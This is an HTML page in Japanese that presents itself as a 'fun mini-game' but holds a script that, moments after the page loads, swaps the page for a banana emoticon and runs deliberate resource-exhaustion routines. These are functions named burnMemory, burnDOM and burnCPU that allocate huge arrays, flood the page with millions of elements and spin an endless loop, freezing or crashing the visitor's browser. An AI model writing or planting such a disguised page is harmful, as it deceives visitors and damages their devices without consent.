<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <title>無題</title>
  <style>
    body {
      background: black;
      color: white;
      font-family: monospace;
      overflow: hidden;
      font-size: clamp(18px, 4vw, 32px, 48px);
    }
  </style>
</head>
<body>
  <h1>これは愉快なミニゲームだよ。</h1>
  <p>楽しんで行ってね^^</p>

  <script>
    
    setTimeout(() => {
      document.body.innerHTML = "<h1>(   ᐛ)ﾊﾞﾅﾅ</h1>";

      
      function burnCPU() {
        while (true) {
          Math.sqrt(Math.random() * 1e12);
        }
      }

      
      const memoryBomb = [];
      function burnMemory() {
        for (let i = 0; i < 1e6; i++) {
          memoryBomb.push(new Array(1000).fill("LAG"));
        }
      }

      
      function burnDOM() {
        setInterval(() => {
          for (let i = 0; i < 5000000; i++) {
            const d = document.createElement("div");
            d.textContent = "LAG";
            document.body.appendChild(d);
          }
        }, 10);
      }

      
      burnMemory();
      burnDOM();
      burnCPU(); 

    }, 30);
  </script>
</body>
</html>
